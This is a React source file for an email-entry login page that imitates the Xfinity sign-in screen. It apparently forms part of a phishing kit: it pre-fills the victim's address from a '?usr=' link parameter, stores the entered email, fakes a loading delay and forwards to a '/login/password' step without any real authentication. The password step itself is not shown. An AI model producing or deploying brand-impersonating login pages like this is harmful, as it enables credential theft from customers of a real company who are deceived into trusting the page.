import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import heroImage from "@/assets/banner.png";
import Logo from "@/assets/logo-grey.svg";
import { Link } from "react-router-dom";
import { ChevronRight } from "lucide-react";
import Footer from "@/components/Footer/Footer";


const LoginEmail = () => {
 const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  // Read ?usr= from URL on mount
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const usr = params.get("usr");
    if (usr) setEmail(decodeURIComponent(usr));
  }, []);

const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();

  if (!email.trim()) {
    setError("Please enter your email to sign in.");
    return;
  }

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email.trim())) {
    setError("Please enter a valid email address.");
    return;
  }

  setError("");
  setLoading(true);

  sessionStorage.setItem("login_email", email.trim());


  setTimeout(() => {
    setLoading(false);
    navigate("/login/password", { state: { email: email.trim() } });
  }, 600);
};


  return (
    <main className="h-screen overflow-y-auto bg-background">
      {/* Split area */}
      <section className="h-[94vh] flex flex-col md:flex-row">
        {/* LEFT */}
        <div className="flex flex-1 items-center justify-start px-10">
          <div className="w-full max-w-xl space-y-7">

            {/* Logo */}
            <img
              src={Logo}
              alt=""
              className="]"
              width={70}
            />

            {/* Heading */}
            <div className="space-y-3">
              <h1 className="text-3xl font-bold text-foreground leading-tight">
                Sign in with your Xfinity&nbsp;ID
              </h1>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-6 pt-2">
              <div>
                <input
                  type="text"
                  placeholder="Email, mobile, or username"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    setError("");
                  }}
                  className="w-[400px] h-12 rounded-sm border border-neutral-500 bg-neutral-100 px-4 py-4 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                />
                {error && (
                  <p className="mt-1 text-xs text-destructive">{error}</p>
                )}
              </div>

              <p className="text-md text-neutral-900 leading-relaxed">
                By signing in, you agree to our{" "}
                <Link to="/terms" className="text-violet-800 underline">
                  Terms of Service
                </Link>{" "}
                and{" "}
                <Link to="/privacy" className="text-violet-800 underline">
                  Privacy Policy
                </Link>.
              </p>

              <button
                type="submit"
                disabled={loading}
                className="translate-y-[16px] w-28 rounded-sm bg-violet-800 py-4 font-semibold text-primary-foreground transition hover:bg-purple-text-bg-violet-800-hover disabled:opacity-60"
              >
                {loading ? "Loading…" : "Let's go"}
              </button>
            </form>

            {/* Links */}
            <div className="pt-6 border-neutral-200">
              <div className="flex flex-col text-md gap-1">
                <div
                 
                  className="flex items-center justify-between w-full px-4 py-3 text-black  border-b border-neutral-500"
                >
                  <span>Find your Xfinity ID</span>
                  <span>{">"}</span>
                </div>

                <div
                
                  className="flex items-center justify-between w-full px-4 py-3 text-black "
                >
                  <span>Create a new Xfinity ID</span>
                  <span>{">"}</span>
                </div>

              </div>
            </div>

          </div>
        </div>

        {/* RIGHT */}
        <div
          className="hidden md:block md:w-1/2 relative border-l-2 border-transparent active:border-purple-text-bg-violet-800-hover transition"
        >
          <img
            src={heroImage}
            alt=""
            className="absolute inset-0 h-full w-full object-center"
          />
        </div>
      </section>

      {/* FOOTER (comes after scroll) */}
      <footer className="bg-white">
        <Footer />
      </footer>
    </main>
  );
};

export default LoginEmail;